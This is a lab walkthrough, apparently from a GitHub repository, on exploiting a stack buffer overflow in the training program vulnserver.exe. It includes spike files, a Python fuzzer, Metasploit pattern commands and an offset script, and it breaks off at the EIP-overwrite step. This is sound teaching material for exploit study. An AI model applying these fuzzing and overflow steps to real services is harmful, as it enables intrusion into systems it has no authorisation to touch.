# A simple walkthrough for a windows vulnerable server (vulnserver.exe)

This tutorial is based on the "Practical Ethical Hacking - The Complete Course", a Udemy course made by Mr. Heath Adams (The Cyber Mentor)

# Requirements
- Download and install: Kali (for attacker machine) and windows 10 (victim's machine)
- Immunity Debugger: https://www.immunityinc.com/products/debugger/
- Vulnserver: http://www.thegreycorner.com/p/vulnserver.html

# Things to remember:
1. Make sure you disable the Windows Defender in Windows VM.
2. Allow files and printer sharing in your firewall (make sure you can ping windows VM from your Kali VM).
3. Always run Immunity Debugger (IMD) and Vulnserver.exe as Administrator.
4. Close and re-run Immunity Debugger and Vulnserver.exe after an attack from Kali machine to prevent issues.

# Steps to conduct bufferoverflow
1. Spiking 
2. Fuzzing  
3. Find the Offset
4. Overwriting the EIP
5. Finding Bad Characters
6. Finding Right Modules (MSF)
7. Generating shellcode (MSF)
8. Root!

## I. Spiking
1. On windows, open vulnserver.exe (always run as administrator)
2. On Kali VM, try to test if Kali can connect to Windows via netcat. Usuallly, vulnserver runs on port 9999.
```
$ nc -nv 192.168.17.134 9999
```
This will be the result if you type **HELP**

![HELP_cmd](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/HELP_command.png)

>We can use these command to test if the target is vulnerable to bufferoverflow. \
>We will try use STATS but **spoiler alert, TRUN is the correct payload for this exercise.

3. We will create files with payload and try if the target machine is vulnerable to bufferoverflow. Create a filed called '[stats.spk](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/stats.spk)' and ‘[trun.spk](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/trun.spk)’

>stats.spk

````spk
s_readline();
s_string("STATS ");
s_string_variable("0");
````
>trun.spk

```
s_readline();
s_string("TRUN ");
s_string_variable("0");
```
4. Open **IMD** as administrator, click File > Attach > select vulnserver > click Attach > click the run icon ![IMD_run_icon](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/IMD_run_icon.png)

![file_attach_img](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/file_attach.png)

![vulnserver_attach_img](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/vulnserver_attach.png)

It will look something like this

![imd_vulnserver_attached_img](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/imd_vulnserver_attached.png)

>In the lower right you can see the status **Paused** ![paused_img](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/paused.png) \
>Click the run button on the menu ![IMD_run_icon](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/IMD_run_icon.png) to change the status to **Running** ![running_status](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/running.png) 

5. On Kali, run **generic_send_tcp** <target_ip> <port> <payload_file.spk> 0 0.

```
$ generic_send_tcp 192.168.17.134 9999 stats.spk 0 0
```

![fuzzing_output_img](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/fuzzing_output.png) 

>**IMPORTANT NOTE!** Always close and re-run the IMD and vulnserver.exe as administrator before doing new attack test.

6. Check the **IMD**, **STATS** command will not make the target crash so we will try the **TRUN** command.

```
$ generic_send_tcp 192.168.17.134 9999 trun.spk 0 0
```

>Check the **IMD** again and it should look like this. We can see bunch of **A**s and hex **41414141** \
>**41** means hex of letter **A**. Four bytes of **41** is equal to hex **41414141** \
>Our payload using **TRUN** command is successful and made the vulnserver crashed!!! Now we confirmed that the server is vulnerable to bufferoverflow!

![spiking_srcshot](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/spiking_srcshot.png) 

>**Q: How and why the system crashed?** \
>A: By sending bunch of As, to the stack buffer. The stack buffer (EAX register) over flows and we successfully allocated As to the Base Pointer (EBP) and Instruction Pointer (EIP). We can see that EBP and EIP values are all 41414141


>**Q: What is EIP and why it is very important to understand?** \
>A: The Instruction Pointer (IP) is where the actual command executes!! So, if we can overwrite this, we can send malicious code and gain reverse shell.

## II. Fuzzing

1. We will automate the sending of bunch of As using python script. Make a python2 script ‘fuzz.py’ and copy paste this script.

>fuzz.py

````python
#!/usr/bin/python
import sys, socket
from time import sleep

buffer = 'A' * 100 

while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(('192.168.17.134', 9999))

		s.send(('TRUN /.:/' + buffer))
		s.close()
		sleep(1) 
		buffer = buffer + 'A' * 100
		
	except:
		print "Fuzzing crashed at %s bytes" % str(len(buffer)) 
		sys.exit()

````

> Dont forget to change its permission to executable. 

```
$ chmod +x fuzz.py
```

>**Q: What does this code do?** \
>A: The script sends 100 As to the vulnserver then it adds another 100 As, so the buffers grows every iteration until it crash.

2. Close and re-run the **IMD** and **vulnserver.exe**. Re-attach vulnserver to IMD then hit the Run button. Makse sure the status is '**Runing**'.

3. Run the python2 script:

```
$ ./fuzz.py
```

4. Observe the **IMD** and wait for it to crash then immediately terminate the fuzz.py script by pressing **CTRL + C**. \
   We can see in the **IMD** that the vulserver crash by checking its status to **Paused** and also we see again the bunch of As in the **Registers** section.

   ![fuzzing_crashed](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/fuzzing_crashed.png)

5. We see that the vulnserver crashed at around 2200 bytes. So the Offset must be less than 2200 bytes. \
   If you CTRL + C and your result is not 2200 bytes, that's okay because the Offset must be less than what you get in the result.

## III. Finding the Offset

1. On Kali create string pattern and use 3000 length of bytes

```
$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
```

2. Copy the string result of the ruby script

![pattern_create_rb](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/pattern_create_rb.png)

3. Create a python file called ‘**offset.py**’ and add +x permission to it then copy paste this code.

>offset.py

````python
#!/usr/bin/python
import sys, socket

offset = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9'

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.17.134', 9999))

	s.send(('TRUN /.:/' + offset))
	s.close()
	
except:
	print "Error connecting to the server!"
	sys.exit()

````

>Q: What does this code do? \
>A: The script sends string pattern and we will use this pattern to find the exact offset of the EIP.

4. At this point I assume that you already know the drill of re-running **IMB** and **vulnserver** as Administrator, attach them then **Run**.

5. Run the **./offset.py**

6. Check the **IMB** and the registers should look like this. Please check the **EIP!** Remember why this is very important?

![registers_eip_386f4337](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/registers_eip_386f4337.png)

7. Now, we got a **EIP** value from our random offset string. All we have to do is to find its memory address so we know what to replace and where we put our malicious **shell code**.

8. On Kali, find the memory address of this **386f4337** hex value.

```
$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337
```
   This should return 2003 bytes
   ![offset_match_2003](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/offset_match.png)
   
## IV. Overwritting the EIP

1. Now we know that the Offset is in 2003 bytes, we know where to overwrite the EIP with our own payload. \
   Create a python script named ‘overwrite_eip.py’ and add +x to its permission

>overwrite_eip.py







































